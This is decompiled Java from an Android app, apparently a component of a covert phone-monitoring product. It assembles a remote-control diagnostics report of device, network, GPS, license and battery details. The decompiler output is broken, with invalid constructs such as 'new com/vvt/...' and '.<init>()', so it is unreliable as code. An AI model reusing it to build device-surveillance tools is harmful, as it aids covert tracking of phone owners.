package com.vvt.appengine.a;

import android.content.Context;
import android.location.LocationManager;

import com.vvt.appengine.AppEngine1;
import com.vvt.base.FxAddressbookMode;
import com.vvt.base.RunningMode;
import com.vvt.connectionhistorymanager.ConnectionHistoryEntry;
import com.vvt.io.r;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefAddressBook;
import com.vvt.productinfo.ProductInfoImpl;
import com.vvt.pushnotification.connectionhistory.PushConnectionHistoryEntry;
import com.vvt.pushnotification.connectionhistory.Status;
import com.vvt.pushnotification.d;
import com.vvt.remotecontrol.RemoteControlException;
import com.vvt.remotecontrol.output.RmtCtrlOutputDiagnostics;
import com.vvt.remotecontrol.output.RmtCtrlOutputDiagnostics.LastConnection;
import com.vvt.remotecontrol.output.RmtCtrlOutputDiagnostics.LastPushConnection;
import java.util.List;

public class h
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  private RmtCtrlOutputDiagnostics.LastPushConnection a(d paramd)
  {
    PushConnectionHistoryEntry localPushConnectionHistoryEntry = paramd.h();
    RmtCtrlOutputDiagnostics.LastPushConnection localLastPushConnection = new com/vvt/remotecontrol/output/RmtCtrlOutputDiagnostics$LastPushConnection;
    localLastPushConnection.<init>();
    String str1 = "unknown";
    long l = 0L;
    String str2 = "";
    String str3 = "unknown";
    String str4 = "";
    int i = 0;
    Status localStatus = null;
    if (localPushConnectionHistoryEntry != null)
    {
      str1 = localPushConnectionHistoryEntry.getConnectionType().toString();
      l = localPushConnectionHistoryEntry.getDate();
      str2 = localPushConnectionHistoryEntry.getMessage();
      str3 = localPushConnectionHistoryEntry.getPushProtocal().toString();
      localStatus = localPushConnectionHistoryEntry.getStatus();
      str4 = localStatus.toString();
      i = localPushConnectionHistoryEntry.getStatusCode();
    }
    localLastPushConnection.setConnectionType(str1);
    localLastPushConnection.setDate(l);
    localLastPushConnection.setMessage(str2);
    localLastPushConnection.setProtocolType(str3);
    localLastPushConnection.setConnectionStatus(str4);
    localLastPushConnection.setConnectionStatusCode(i);
    return localLastPushConnection;
  }
  
  private boolean b(AppEngine1 paramh)
  {
    return paramh.a().getPackageManager().hasSystemFeature("android.hardware.location.gps");
  }
  
  private boolean c(AppEngine1 paramh)
  {
    return paramh.a().getPackageManager().hasSystemFeature("android.hardware.location.network");
  }
  
  public RmtCtrlOutputDiagnostics a(AppEngine1 paramh)
  {
    boolean bool1 = a;
    if (bool1) {}
    RemoteControlException localRemoteControlException;
    try
    {
      Object localObject1 = paramh.a();
      Object localObject3 = paramh;
      Object localObject4 = paramh.o;
      int j = ((ProductInfoImpl)localObject4).getProductId();
      localObject4 = String.valueOf(j);
      Object localObject5 = paramh.o;
      localObject5 = ((ProductInfoImpl)localObject5).getProductVersion();
      Object localObject6 = paramh.l;
      localObject6 = ((com.vvt.phoneinfo.b)localObject6).g();
      Object localObject7 = paramh.f;
      localObject7 = ((com.vvt.connectionhistorymanager.b)localObject7).b();
      long l1 = ((ConnectionHistoryEntry)localObject7).getDate();
      Object localObject8 = ((ConnectionHistoryEntry)localObject7).getAPN();
      int k = ((ConnectionHistoryEntry)localObject7).getStatusCode();
      localObject7 = String.valueOf(k);
      RmtCtrlOutputDiagnostics.LastConnection localLastConnection = new com/vvt/remotecontrol/output/RmtCtrlOutputDiagnostics$LastConnection;
      localLastConnection.<init>();
      localLastConnection.setApn((String)localObject8);
      localLastConnection.setStatusCode((String)localObject7);
      localLastConnection.setTimeMs(l1);
      localObject7 = com.vvt.z.a.a((Context)localObject1);
      String str1 = com.vvt.z.a.b((Context)localObject1);
      Object localObject9 = paramh.l;
      localObject9 = ((com.vvt.phoneinfo.b)localObject9).c();
      if (localObject9 != null)
      {
        localObject9 = paramh.l;
        localObject9 = ((com.vvt.phoneinfo.b)localObject9).c();
        m = ((String)localObject9).length();
        n = 1;
        if (m >= n) {}
      }
      else
      {
        localObject3 = paramh;
        localObject9 = paramh.l;
        localObject8 = paramh.b();
        ((com.vvt.phoneinfo.b)localObject9).a((Context)localObject1, (String)localObject8);
      }
      localObject3 = paramh;
      localObject9 = paramh.l;
      int m = ((com.vvt.phoneinfo.b)localObject9).b();
      localObject9 = String.valueOf(m);
      localObject8 = paramh.l;
      int n = ((com.vvt.phoneinfo.b)localObject8).a();
      localObject8 = String.valueOf(n);
      Object localObject10 = paramh.l;
      localObject10 = ((com.vvt.phoneinfo.b)localObject10).c();
      com.vvt.eventrepository.c localc = paramh.j;
      long l2 = localc.e();
      String str2 = paramh.b();
      long l3 = com.vvt.w.a.a((Context)localObject1);
      Object localObject11 = "location";
      localObject3 = localObject11;
      localObject1 = ((Context)localObject1).getSystemService((String)localObject11);
      localObject1 = (LocationManager)localObject1;
      boolean bool3 = true;
      localObject11 = ((LocationManager)localObject1).getProviders(bool3);
      long l4 = r.g();
      localObject3 = paramh;
      localObject1 = paramh.n;
      Object localObject12 = FxPreferenceType.ADDRESSBOOK;
      localObject3 = localObject12;
      localObject1 = ((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject12);
      localObject1 = (PrefAddressBook)localObject1;
      localObject1 = ((PrefAddressBook)localObject1).getMode();
      int i = ((FxAddressbookMode)localObject1).ordinal();
      localObject3 = paramh;
      localObject3 = paramh.k;
      localObject12 = localObject3;
      localObject12 = ((com.vvt.license.b)localObject3).a();
      localObject12 = ((LicenseInfo)localObject12).getActivationCode();
      boolean bool4 = b(paramh);
      boolean bool5 = c(paramh);
      localObject3 = paramh;
      localObject3 = paramh.E;
      int i1 = ((com.vvt.c.c)localObject3).b();
      localObject3 = paramh;
      Object localObject13 = paramh.s;
      localObject3 = this;
      localObject13 = a((d)localObject13);
      localObject3 = paramh;
      localObject3 = paramh.k;
      Object localObject14 = localObject3;
      localObject14 = ((com.vvt.license.b)localObject3).a();
      localObject14 = ((LicenseInfo)localObject14).getLicenseStatus();
      localObject14 = ((LicenseStatus)localObject14).toString();
      localObject3 = paramh;
      localObject3 = paramh.k;
      Object localObject15 = localObject3;
      localObject15 = ((com.vvt.license.b)localObject3).a();
      int i2 = ((LicenseInfo)localObject15).getConfigurationId();
      localObject15 = String.valueOf(i2);
      RmtCtrlOutputDiagnostics localRmtCtrlOutputDiagnostics = new com/vvt/remotecontrol/output/RmtCtrlOutputDiagnostics;
      localRmtCtrlOutputDiagnostics.<init>();
      localObject3 = localRmtCtrlOutputDiagnostics;
      localRmtCtrlOutputDiagnostics.setProductId((String)localObject4);
      localRmtCtrlOutputDiagnostics.setProductVersion((String)localObject5);
      localRmtCtrlOutputDiagnostics.setPhoneModel((String)localObject6);
      localRmtCtrlOutputDiagnostics.setLastConnection(localLastConnection);
      localRmtCtrlOutputDiagnostics.setDefaultApn((String)localObject7);
      localRmtCtrlOutputDiagnostics.setDefaultWifi(str1);
      localRmtCtrlOutputDiagnostics.setCountryCode((String)localObject9);
      localRmtCtrlOutputDiagnostics.setNetworkCode((String)localObject8);
      localRmtCtrlOutputDiagnostics.setNetworkOperatorName((String)localObject10);
      localRmtCtrlOutputDiagnostics.setDatabaseSize(l2);
      localRmtCtrlOutputDiagnostics.setWorkingDirectory(str2);
      localRmtCtrlOutputDiagnostics.setAvailableMemory(l3);
      localRmtCtrlOutputDiagnostics.setGpsProviders((List)localObject11);
      localRmtCtrlOutputDiagnostics.setFreeSpace(l4);
      localObject4 = paramh.d();
      localRmtCtrlOutputDiagnostics.setRunningMode((RunningMode)localObject4);
      localRmtCtrlOutputDiagnostics.setAddressBoookMode(i);
      localRmtCtrlOutputDiagnostics.setActivationCode((String)localObject12);
      localRmtCtrlOutputDiagnostics.setIntegratedGps(bool4);
      localRmtCtrlOutputDiagnostics.setNetworkGps(bool5);
      localRmtCtrlOutputDiagnostics.setCurrentBatteryLevel(i1);
      localRmtCtrlOutputDiagnostics.setLastPushConnection((RmtCtrlOutputDiagnostics.LastPushConnection)localObject13);
      localRmtCtrlOutputDiagnostics.setLicenStatus((String)localObject14);
      localRmtCtrlOutputDiagnostics.setConfigurationID((String)localObject15);
      bool2 = a;
      if (bool2) {}
      return localRmtCtrlOutputDiagnostics;
    }
    finally
    {
      boolean bool2 = b;
      if (bool2) {}
      localRemoteControlException = new com/vvt/remotecontrol/RemoteControlException;
      localRemoteControlException.<init>("Unexpected error found.");
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/AppEngine1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */